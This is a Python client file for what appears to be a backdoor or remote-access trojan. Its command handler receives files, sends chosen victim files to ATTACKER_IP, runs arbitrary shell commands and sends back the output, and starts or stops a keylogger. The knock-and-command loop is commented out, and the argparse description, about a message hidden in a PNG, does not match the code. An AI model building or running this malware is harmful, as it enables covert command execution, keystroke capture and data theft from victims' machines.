import argparse
import signal
import sys
import time

from pathlib import Path

from scapy.all import *
from scapy.layers.inet import UDP, IP, TCP

from mods.protocol import send_data, receive_data, send_ack_packet
from mods.knocking import wait_for_knock
from mods.keylogger import start_keylogger, stop_keylogger
from mods.monitoring import start_watching

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Extract and decrypt a message hidden in a PNG.")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--max-bytes", type=int, default=2048)
    return p

SAVE_DIR = 'data_victim/'


ATTACKER_IP = '127.0.0.1'

def run_shell_command(args) -> str:
    print(f'Running... {args}')
    res = subprocess.run(args, capture_output=True, text=True)
    if res.returncode == 0:
        return res.stdout
    else:
        return res.stderr
    
def handle_command(cmd: str, args: list[str]) -> str:
    if cmd == 'sf':
        filename = args[0]
        send_ack_packet(ATTACKER_IP)
        file_bytes = receive_data()
        with open(f'data_victim/{filename}', 'wb') as f:
            f.write(file_bytes)
        return f'Downloaded file {filename}'
    elif cmd == 'dl':
        raw_path = args[0]
        filepath = Path(raw_path)
        if not filepath.is_file():
            return 'Unable to find the file'
        send_ack_packet(ATTACKER_IP)
        file_bytes = filepath.read_bytes()
        send_data(file_bytes, ATTACKER_IP)
        return f'Sent file {filepath.name}'
    elif cmd == 'rn':
        result = run_shell_command(args)
        send_ack_packet(ATTACKER_IP)
        send_data(result.encode(), ATTACKER_IP)
        return f'Ran command {args}'
    elif cmd == 'k+':
        result = start_keylogger()
        send_data(result.encode(), ATTACKER_IP)
        return 'Keylogger started'
    elif cmd == 'k-':
        result = stop_keylogger()
        send_data(result.encode(), ATTACKER_IP)
        return f'Keylogger stopped'
    else:
        return 'Unrecognized command'

def sigint_handler(sig, frame):
    print('\nExiting...')
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, sigint_handler)

    print('hello from client')
    # attacker_ip = wait_for_knock()
    # print(f'knocking success from {attacker_ip}')
    # send_ack_packet(attacker_ip)

    # while True:
    #     command = receive_data(timeout=360)
    #     decoded = command.decode()
    #     print(f'Received: {decoded}')
    #     parts = decoded.split(' ')
    #     res = handle_command(parts[0], parts[1:])
    #     print(res)
    start_watching('test/')

 
if __name__ == "__main__":
    main()